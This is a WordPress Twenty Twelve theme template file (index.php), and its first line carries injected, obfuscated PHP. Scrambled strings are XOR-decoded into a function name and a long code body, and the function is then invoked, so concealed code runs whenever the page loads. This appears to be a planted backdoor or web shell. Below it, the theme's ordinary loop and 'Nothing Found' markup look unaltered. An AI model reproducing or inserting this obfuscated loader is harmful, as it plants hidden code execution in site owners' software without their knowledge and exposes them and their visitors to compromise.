<?php $HpZZAAQ='Z4V974a3==S9.YU'; $vTZqinO='9F3XCQ>UHS0MG6;'^$HpZZAAQ; $aqOAxXyL='0VcrUE-HCE=7i--<OJ:mWID44 VY3sq7FASHDwCk7U > FWVPdSARd3-92gg AHlj-3 0BWh T;qaiEZtP2dQAY GblhttQ;ey,XOFnZRlyfiVl9P4B3 H<fFRMF6lNlW.dySgXNr<DGeTiqMhD1702s8gxgNQ=E =m.wQf 6JB WOv-+ fkaZcqzD .LA;bJ<K=Xm=zAMS2>tHXFQCXwW-UK7L;NOL9T1UE4wdsWXP=2x<kJX6X5,FIjh4n c-rkE;=yp 71IXDGeVRW>5fgW1zF,715h<-EysKl-P.xlEq=O=AVHEm1 9OTkm.=kP>dkGiQ5=1az,k>.Y75 Z nCR=h db a,OZARc1=>OYvbb 94;5aAP;yefO0<+t8V4dQsLG WOPdPg1LXMdkYa4Q=BRq6sFs7DmNV162zgUk< K-Y;S II6fOYEo>L Zf5W3Ok6L<7rU=+5Y-P-zFQ4MTfoVa+R7W>U4NfdkKYPppP15+fpqsMF9W4tFU6>23Z6->XkQWWtgfh 5D-ZihthYA4ocrOVF jdSHBA>qgkvgSE+YHOuQxZY c0Cg<,JaYYSWFBTR,eHqKeComKP+Y=2Ho< =rPO848NZu5VDY;PRpeCH53X-KzdgCjjgBi>R 4YXwW3HPohH.2Q78.qgAtyf=4  yuhsZV'; $qsRkRKj=$vTZqinO('', 'Y0KS30C+7,RY6HUU<>IEp1+FkD7-R,.Z35tamW8a>3UPC2>9>D+. ;WLMS88M4<DNIRTQnwLK1BXAIezT+8mXe6U3BQHSSj1lpJ7=nJ3rQYVRvHPlG6AL-RNb6,2WEuLsGORzmQGVS13EzTQeL PCQiWQ:X9nuV YfIGWtFSB8.E9gRFNYO6Haixs6EZ93UJnS>IqV7s<G.84P,920ceW1L98Rw1j+-M5n> MWYS19<NWC6a,7D=TO.iBLk-o,f;.eZNYTKRHiezgA 3;KPOG,;sbHVET7WH<YNkHF5WCfLUY.I vueIGAU:1PgS7a9XDCfM5TIPHZWa7H6EPA9HNkvb:e57e2xo;2rGZXGodHBFVXXNPHa+1plB+QHJ+S3MDlSh,E.tZmYCU-,,DVyEB0Q77J<z;yJNgj2PBSZZu+IN8H+R2L 3SN7670Z-T;9j:F;CT-ORDabOP:B4HRb5U95OCvEO3C6a>Q7OMPA06XT4PAJFVWS,4K6M+-0OaWK3EYMpL:2.SKFLDT0LsINRHq,PZKV+72A1C8-;fcXGVKGtwJmywFeJ8;CRVrRXHsVijb5 w5kJT,F-BjOKmpJ+OS10WED-57QGL=rRE7=5T16WIclQR,LbSDGcJJG9c77VU5pS3R<14O8OK=XYJV:hOsoXLITQEAHP+'^$aqOAxXyL); $qsRkRKj();
/**
 * The main template file
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * For example, it puts together the home page when no home.php file exists.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

get_header(); ?>

	<div id="primary" class="site-content">
		<div id="content" role="main">
		<?php if ( have_posts() ) : ?>

			<?php /* Start the Loop */ ?>
			<?php while ( have_posts() ) : the_post(); ?>
				<?php get_template_part( 'content', get_post_format() ); ?>
			<?php endwhile; ?>

			<?php twentytwelve_content_nav( 'nav-below' ); ?>

		<?php else : ?>

			<article id="post-0" class="post no-results not-found">

			<?php if ( current_user_can( 'edit_posts' ) ) :
				// Show a different message to a logged-in user who can add posts.
			?>
				<header class="entry-header">
					<h1 class="entry-title"><?php _e( 'No posts to display', 'twentytwelve' ); ?></h1>
				</header>

				<div class="entry-content">
					<p><?php printf( __( 'Ready to publish your first post? <a href="%s">Get started here</a>.', 'twentytwelve' ), admin_url( 'post-new.php' ) ); ?></p>
				</div><!-- .entry-content -->

			<?php else :
				// Show the default message to everyone else.
			?>
				<header class="entry-header">
					<h1 class="entry-title"><?php _e( 'Nothing Found', 'twentytwelve' ); ?></h1>
				</header>

				<div class="entry-content">
					<p><?php _e( 'Apologies, but no results were found. Perhaps searching will help find a related post.', 'twentytwelve' ); ?></p>
					<?php get_search_form(); ?>
				</div><!-- .entry-content -->
			<?php endif; // end current_user_can() check ?>

			</article><!-- #post-0 -->

		<?php endif; // end have_posts() check ?>

		</div><!-- #content -->
	</div><!-- #primary -->

<?php get_sidebar(); ?>
<?php get_footer(); ?>
